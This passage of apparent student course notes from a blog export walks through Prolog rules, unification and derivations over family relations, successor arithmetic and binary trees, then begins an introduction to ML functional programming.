<li><p>Variables in a rule are universally quantified</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Parent: For all X &amp; Y, X is a parent of Y if X is a father or mother of Y. */</span></span><br><span class="line">parent(<span class="symbol">X</span>, <span class="symbol">Y</span>) :- father(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line">parent(<span class="symbol">X</span>, <span class="symbol">Y</span>) :- mother(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line"></span><br><span class="line">?- parent(<span class="symbol">X</span>, kari). <span class="comment">/* X = randy */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>More exmaples:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Grandfather: For all X, Y &amp; Z, X is a grandfather of Z </span></span><br><span class="line"><span class="comment">                if X is a father of Y and Y is a parent of Z. */</span></span><br><span class="line">grandfather(<span class="symbol">X</span>, <span class="symbol">Z</span>) :- father(<span class="symbol">X</span>, <span class="symbol">Y</span>), parent(<span class="symbol">Y</span>, <span class="symbol">Z</span>).</span><br><span class="line"></span><br><span class="line">?- grandfather(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line"><span class="comment">/* X = george       X = randy       X = randy</span></span><br><span class="line"><span class="comment">   Y = kari;        Y = mary;       Y = peter */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Rule for ancestor</p>
<ul>
<li>A parent is an ancestor<br>  <code>ancestor(X, Y) :- parent(X, Y)</code></li>
<li>An ancestor of <code>X</code>: a parent of an ancestor of an individual <code>X</code><br>  <code>ancestor(X, Z) :- parent(X, Y), ancestor(Y, Z)</code></li>
</ul>
</li>
</ul>
</li>
<li><p>Unconditional Rules</p>
<ul>
<li>the rules with no body $n&#x3D;0$ is an unconditional rule  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">loves(<span class="symbol">X</span>, doge).  <span class="comment">/* Everyone loves doge */</span></span><br><span class="line">loves(doge, <span class="symbol">X</span>).  <span class="comment">/* doge loves Everyone */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Answer-and-Response"><a href="#Answer-and-Response" class="headerlink" title="Answer and Response"></a>Answer and Response</h2><ol>
<li><p>If the query <font color="F54747">has variables</font></p>
<ul>
<li>the answer subsitution may assign a constant to some of the variables in the query  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(<span class="symbol">X</span>, randy).</span><br><span class="line"><span class="symbol">X</span> = george              <span class="comment">/* Answer subsitution */</span></span><br><span class="line">father(george, randy)   <span class="comment">/* Answer */</span></span><br><span class="line">yes                     <span class="comment">/* Response */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>If the query has <font color="F54747">no variables</font></p>
<ul>
<li>the answer subsitution is vacuous (i.e., the query itself is the Answer)  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(george, randy).</span><br><span class="line">yes     <span class="comment">/* Response */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>When a program consists of <font color="F54747">facts only</font></p>
<ul>
<li>for the correct answer, the answer must literally appear as a fact in the program  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- grandfather(george, <span class="symbol">X</span>).</span><br><span class="line"><span class="symbol">X</span> = kari</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Deriving-Answers"><a href="#Deriving-Answers" class="headerlink" title="Deriving Answers"></a>Deriving Answers</h2><ul>
<li><p>Steps for deriving answers in Prolog</p>
</li>
<li><p><font color="F54747"><strong>Reduction</strong></font></p>
<ul>
<li>A query can be replaced to another by matching the head of the rule.</li>
<li>If a sub-query matched a fact, then that sub-query can be reduced and applying the matching substitution to the entire resulting query.</li>
</ul>
</li>
<li><p><font color="F54747"><strong>Derivation</strong></font></p>
<ul>
<li><p>a sequence of queries and substitutions</p>
</li>
<li><p>Rules:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">grandfather(<span class="symbol">X</span>,<span class="symbol">Z</span>) :- father(<span class="symbol">X</span>,<span class="symbol">Y</span>), parent(<span class="symbol">Y</span>,<span class="symbol">Z</span>).   <span class="comment">/* R1 */</span></span><br><span class="line">parent(<span class="symbol">X</span>,<span class="symbol">Y</span>) :- mother(<span class="symbol">X</span>,<span class="symbol">Y</span>).                     <span class="comment">/* R2 */</span></span><br><span class="line">mother(caroline, nina).                         <span class="comment">/* R3 */</span></span><br><span class="line">father(edwyn, caroline).                        <span class="comment">/* R4 */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Derivation:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- grandfather(<span class="symbol">U</span>, nina).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Replace Q1 with R1 and Subsitute X = U &amp; Z = nina */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- father(<span class="symbol">U</span>, <span class="symbol">Y</span>), parent(<span class="symbol">Y</span>, nina).   <span class="comment">/* By R1 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reduce &quot;father&quot; subquery and Subsitute U = edwyn &amp; Y = caroline */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- parent(caroline, nina)           <span class="comment">/* By R4 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Replace Q3 with R2 */</span></span><br><span class="line"><span class="symbol">Q4</span>: ?- mother(caroline, nina).          <span class="comment">/* By R2 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reduce &quot;mother&quot; subquery */</span></span><br><span class="line"><span class="symbol">Q5</span>: &#123;&#125;                                  <span class="comment">/* By R3 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Successful: grandfather(edwyn, nina) */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Successful Derivation</p>
<ul>
<li>it ends in the empty query</li>
<li>variables in rules serve only as place holders  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">parent(<span class="symbol">A</span>,<span class="symbol">B</span>) :- father(<span class="symbol">A</span>,<span class="symbol">B</span>).</span><br><span class="line"><span class="comment">/* Is equivalent to */</span></span><br><span class="line">parent(<span class="symbol">X</span>,<span class="symbol">Y</span>) :- father(<span class="symbol">X</span>,<span class="symbol">Y</span>).</span><br></pre></td></tr></table></figure></li>
<li>the matching is <font color="3A75EA">two-way</font> (<font color="F54747">unification</font>)  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">father(<span class="symbol">X</span>,caroline) <span class="comment">/* matches */</span> father(edwyn,<span class="symbol">Y</span>)</span><br><span class="line"><span class="symbol">X</span> = edwyn</span><br><span class="line"><span class="symbol">Y</span> = caroline</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="Axiomatization-of-Natural-Numbers"><a href="#Axiomatization-of-Natural-Numbers" class="headerlink" title="Axiomatization of Natural Numbers"></a>Axiomatization of Natural Numbers</h3><ul>
<li><code>0</code>: the number 0</li>
<li><code>s(X)</code>: the successor of <code>X</code> (or <code>X+1</code>)</li>
<li><code>s(0) = 1, s(s(0)) = 2, ...</code></li>
<li>Rules: summation  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">sum(<span class="number">0</span>,<span class="symbol">X</span>,<span class="symbol">X</span>).                     <span class="comment">/* R1 */</span></span><br><span class="line">sum(s(<span class="symbol">X</span>),<span class="symbol">Y</span>,s(<span class="symbol">Z</span>)) :- sum(<span class="symbol">X</span>,<span class="symbol">Y</span>,<span class="symbol">Z</span>). <span class="comment">/* R2: If X+Y=Z, then s(X)+Y=s(Z) */</span></span><br></pre></td></tr></table></figure></li>
<li>Derivation<ul>
<li><p>Example 1:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(s(<span class="number">0</span>),s(<span class="number">0</span>),<span class="symbol">X</span>).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(s(0),s(0),X) with sum(s(A),B,s(C)) */</span></span><br><span class="line"><span class="comment">/* Using A = 0, B = s(0), X = s(C) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- sum(<span class="number">0</span>, s(<span class="number">0</span>), <span class="symbol">C</span>).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(0, s(0), C) with sum(0,D,D) */</span></span><br><span class="line"><span class="comment">/* Using D = s(0), D = C = s(0) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Answer</span>: <span class="symbol">X</span> = s(<span class="symbol">C</span>) = s(s(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 2:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(<span class="symbol">X</span>, s(<span class="number">0</span>), s(s(<span class="number">0</span>))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(X, s(0), s(s(0))) with sum(s(A),B,s(C)) */</span></span><br><span class="line"><span class="comment">/* Using X = s(A), Y = s(0), s(C) = s(s(0)) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- sum(<span class="symbol">A</span>, s(<span class="number">0</span>), s(<span class="number">0</span>)).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(A, s(0), s(0)) with sum(0,D,D) */</span></span><br><span class="line"><span class="comment">/* Using A = 0, D = s(0) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Answer</span>: <span class="symbol">X</span> = s(<span class="symbol">A</span>) = s(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 3:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(<span class="symbol">X</span>,<span class="symbol">Y</span>,s(s(<span class="number">0</span>))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(X,Y,s(s(0))) with sum(0,X,X) */</span></span><br><span class="line"><span class="comment">/* Using X = 0, Y = A = s((0)) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">X</span> = <span class="number">0</span>, <span class="symbol">Y</span> = s((<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- sum(<span class="symbol">X</span>,<span class="symbol">Y</span>,s(s(<span class="number">0</span>))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(X,Y,s(s(0))) with sum(s(A),B,s(C)) */</span></span><br><span class="line"><span class="comment">/* Using X = s(A), Y = B, s(C) = s(s(0)) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- sum(<span class="symbol">A</span>, <span class="symbol">B</span>, s(<span class="number">0</span>)).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying sum(A, B, s(0)) with sum(0,D,D) */</span></span><br><span class="line"><span class="comment">/* Using A = 0, B = D = s(0) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">X</span> = s(<span class="number">0</span>), <span class="symbol">Y</span> = s(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Answer</span>: <span class="symbol">X</span> = <span class="number">0</span>          <span class="symbol">X</span> = s(<span class="number">0</span>)        </span><br><span class="line">        <span class="symbol">Y</span> = s((<span class="number">0</span>));    <span class="symbol">Y</span> = s(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<hr>
<h3 id="Representing-Binary-Trees"><a href="#Representing-Binary-Trees" class="headerlink" title="Representing Binary Trees"></a>Representing Binary Trees</h3><ul>
<li><p>Binary Trees in Prolog</p>
  <img src="https://p.ipic.vip/wo8hd9.png" width="150px" />

<ul>
<li>Rules:  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">btMember(<span class="symbol">E</span>,bt(<span class="symbol">L</span>,<span class="symbol">E</span>,<span class="symbol">R</span>)).                      <span class="comment">/* Rule 1 */</span></span><br><span class="line">btMember(<span class="symbol">E</span>,bt(<span class="symbol">L</span>,<span class="symbol">Rt</span>,<span class="symbol">R</span>)) :- btMember(<span class="symbol">E</span>,<span class="symbol">L</span>).    <span class="comment">/* Rule 2 */</span></span><br><span class="line">btMember(<span class="symbol">E</span>,bt(<span class="symbol">L</span>,<span class="symbol">Rt</span>,<span class="symbol">R</span>)) :- btMember(<span class="symbol">E</span>,<span class="symbol">R</span>).    <span class="comment">/* Rule 3 */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Derivation</p>
<ul>
<li><p>Example 1:    </p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="number">4</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unifying with btMember(E,bt(L,E,R)) */</span></span><br><span class="line"><span class="comment">/* E=4, L=bt(nil,2,bt(nil,4,nil)), E=1, R=bt(bt(nil,5,nil),3,nil) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- &#123;&#125;</span><br><span class="line"></span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 2:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>E = 1</code>:<br>  Q1: ?- btMember(E,bt(bt(nil,2,bt(nil,4,nil)),1,bt(bt(nil,5,nil),3,nil))).</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Unifying with Rule 1 */</span></span><br><span class="line"><span class="comment">/* E=1, L=bt(nil,2,bt(nil,4,nil)), R=bt(bt(nil,5,nil),3,nil) */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 2</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil))).</span><br><span class="line"><span class="comment">/* E=2, L=nil, R=bt(nil,4,nil) */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 3</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil)).</span><br><span class="line"><span class="comment">/* E=3, L=bt(nil,5,nil), R=nil */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 4</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 3 */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- btMember(<span class="symbol">E</span>, bt(nil,<span class="number">4</span>,nil))</span><br><span class="line"><span class="comment">/* E=4, L=nil, R=nil */</span></span><br><span class="line"><span class="symbol">Q4</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>E = 5</code>:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Q1</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">2</span>,bt(nil,<span class="number">4</span>,nil)),<span class="number">1</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil))).</span><br><span class="line"><span class="comment">/* Unifying with Rule 3 */</span></span><br><span class="line"><span class="symbol">Q2</span>: ?- btMember(<span class="symbol">E</span>,bt(bt(nil,<span class="number">5</span>,nil),<span class="number">3</span>,nil)).</span><br><span class="line"><span class="comment">/* Unifying with Rule 2 */</span></span><br><span class="line"><span class="symbol">Q3</span>: ?- btMember(<span class="symbol">E</span>, bt(nil,<span class="number">5</span>,nil))</span><br><span class="line"><span class="comment">/* E=5, L=nil, R=nil */</span></span><br><span class="line"><span class="symbol">Q4</span>: ?- &#123;&#125;</span><br><span class="line"><span class="symbol">Ans</span>: <span class="symbol">E</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Answer:</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">E</span> = <span class="number">1</span>   <span class="symbol">E</span> = <span class="number">2</span>   <span class="symbol">E</span> = <span class="number">3</span>   <span class="symbol">E</span> = <span class="number">4</span>   <span class="symbol">E</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Functional Programming</title>
    <url>/myBlog/2023/04/29/2023/CSCI3180/2023-4-29-CSCI3180-Functional-Programming/</url>
    <content><![CDATA[<h2 id="Functional-Programming"><a href="#Functional-Programming" class="headerlink" title="Functional Programming"></a>Functional Programming</h2><ul>
<li><p>supports another form of declarative programming</p>
<ul>
<li>the building block is true function (no side effect)</li>
</ul>
</li>
<li><p>The conceptual model of functional programming is that of a pocket calculator</p>
<ul>
<li>enter an expression, the calculator returns its value  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">4</span> : <span class="built_in">int</span></span><br><span class="line">- it;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">4</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ol>
<li><p><strong>No Variables Allowed</strong></p>
<ul>
<li>there is no variable like those we have in imperative programming</li>
<li>we can only declare names and assign values (like constant)</li>
<li>we can reuse the same name but cannot mutate the value</li>
</ul>
</li>
<li><p><strong>Functional Value</strong></p>
<ul>
<li><p>the last expression (nameless function)</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fn</span>((x:<span class="built_in">real</span>),(y:<span class="built_in">real</span>)) =&gt; x*x+y*y;</span><br><span class="line"><span class="keyword">val</span> it = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* apply the last functional expression to an argument *)</span></span><br><span class="line">- <span class="keyword">fn</span>((x:<span class="built_in">real</span>),(y:<span class="built_in">real</span>)) =&gt; x*x+y*y (<span class="number">5.0</span>,<span class="number">2.0</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">29.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>name the function</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> sumsq = <span class="keyword">fn</span>((x:<span class="built_in">real</span>),(y:<span class="built_in">real</span>)) =&gt; x*x+y*y;</span><br><span class="line"><span class="keyword">val</span> sumsq = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line">- sumsq(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">1.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Typing in ML</strong></p>
<ul>
<li><p>ML is rather picky about types</p>
</li>
<li><p>ML is a <font color="F54747">highly strongly-typed language</font> in that it requires types of operators and operands to be consistent</p>
<ul>
<li>multiplication is either between integers or between reals, but not between an integer and a real  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="number">2</span> * <span class="number">1.0</span>;  <span class="comment">(* ERROR *)</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Solution:</p>
<ol>
<li>we can transform the integer to its real couterpart <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- (<span class="built_in">real</span> <span class="number">2</span>) * <span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">2.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
<li>we can also apply a built-in function of type <code>int -&gt; real</code> <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="built_in">real</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">2.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
<li><p><strong>Basic Types</strong></p>
<ol>
<li><p><code>int</code></p>
<ul>
<li><code>0</code>, <code>1337</code>, <code>~3</code></li>
<li>Operations: <code>+</code>, <code>-</code>, <code>*</code>, <code>div</code>, <code>mod</code></li>
</ul>
</li>
<li><p><code>real</code></p>
<ul>
<li><code>3.14</code>, <code>2E4</code>, <code>~123.4</code></li>
<li>Operations: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code></li>
</ul>
</li>
<li><p><code>bool</code></p>
<ul>
<li><code>true</code>, <code>false</code></li>
<li>Operations: <code>not</code>, <code>and</code>, <code>or</code>, <code>andalso</code>, <code>orelse</code></li>
<li><font color="3A75EA"><strong>Noted</strong></font>: <code>andalso</code> and <code>orelse</code> use <font color="3A75EA">short-circuit</font> evaluation</li>
</ul>
</li>
<li><p><code>string</code></p>
<ul>
<li><code>&quot;doge&quot;</code>, <code>&quot;is&quot;</code>, <code>&quot;awesome&quot;</code></li>
<li>Operations: <code>^</code> (conjunction)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="string">&quot;doge&quot;</span> ^ <span class="string">&quot;is&quot;</span> ^ <span class="string">&quot;awesome&quot;</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="string">&quot;dogeisawesome&quot;</span> : <span class="built_in">string</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p><strong>Type Inference</strong></p>
<ul>
<li>ML can infer the types of an expression without the user declaring any time  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> sq(x) = x*x;</span><br><span class="line"><span class="keyword">val</span> sq = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- <span class="keyword">fun</span> sq(x:<span class="built_in">real</span>) = x*x;</span><br><span class="line"><span class="keyword">val</span> sq = <span class="keyword">fn</span> : <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line">- <span class="keyword">fun</span> sq x = (x:<span class="built_in">real</span>)*x;</span><br><span class="line"><span class="keyword">val</span> sq = <span class="keyword">fn</span> : <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Conditional-Expression"><a href="#Conditional-Expression" class="headerlink" title="Conditional Expression"></a>Conditional Expression</h2><ul>
<li><p>Free standing conditional expression</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">if</span> (floor (<span class="number">323.43</span>*sin(<span class="number">1.0</span>)) mod <span class="number">2</span>) = <span class="number">0</span></span><br><span class="line">=     <span class="keyword">then</span> <span class="string">&quot;even&quot;</span> <span class="keyword">else</span> <span class="string">&quot;odd&quot;</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="string">&quot;even&quot;</span> : <span class="built_in">string</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Examples:</p>
<ul>
<li><p>Absolute value <code>abs</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> abs x = <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">then</span> x <span class="keyword">else</span> ~x;</span><br><span class="line"><span class="keyword">val</span> abs = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Check negative <code>negative</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> negative x = x &lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">val</span> negative = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Tuples"><a href="#Tuples" class="headerlink" title="Tuples"></a>Tuples</h2><ul>
<li><p>values can be combined into tuples</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> origin = (<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>);</span><br><span class="line"><span class="keyword">val</span> origin = (<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>) : <span class="built_in">real</span> * <span class="built_in">real</span> * <span class="built_in">real</span></span><br><span class="line">- <span class="keyword">fun</span> length (x,y,z) = <span class="type">Math</span>.sqrt(x*x + y*y + z*z);</span><br><span class="line"><span class="keyword">val</span> length = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="F54747"><strong>Note</strong></font>: every function in ML is <font color="F54747">one-argument function</font></p>
<ul>
<li>it looks like a multi-argument function, but the argument is just a tuple</li>
</ul>
</li>
</ul>
<h3 id="Selector-Functions"><a href="#Selector-Functions" class="headerlink" title="Selector Functions"></a>Selector Functions</h3><ul>
<li>it is used to explicitly select the components of a tuple</li>
<li>underscore <code>_</code> is the wildcard symbol used in <font color="3A75EA">pattern matching</font> (it would ignore the type)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> first (x,_,_) = x;</span><br><span class="line"><span class="keyword">val</span> first = <span class="keyword">fn</span> : <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;b</span> * <span class="symbol">&#x27;c</span> -&gt; <span class="symbol">&#x27;a</span></span><br><span class="line">- <span class="keyword">fun</span> second (_,y,_) = y;</span><br><span class="line"><span class="keyword">val</span> second = <span class="keyword">fn</span> : <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;b</span> * <span class="symbol">&#x27;c</span> -&gt; <span class="symbol">&#x27;b</span></span><br><span class="line">- <span class="keyword">fun</span> third (_,_,z) = z;</span><br><span class="line"><span class="keyword">val</span> third = <span class="keyword">fn</span> : <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;b</span> * <span class="symbol">&#x27;c</span> -&gt; <span class="symbol">&#x27;c</span></span><br><span class="line"></span><br><span class="line">- first(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">1</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Local-Declaration"><a href="#Local-Declaration" class="headerlink" title="Local Declaration"></a>Local Declaration</h2><ul>
<li><p>declare a value that have to be local in the function </p>
</li>
<li><p>Example: Area of a triangle<br>  $$ Area &#x3D; \sqrt{p(p-a)(p-b)(p-c)} \quad \text{where} \space p &#x3D; \frac{a+b+c}{2} $$</p>
<ul>
<li>given that $p$ can simplify a formula</li>
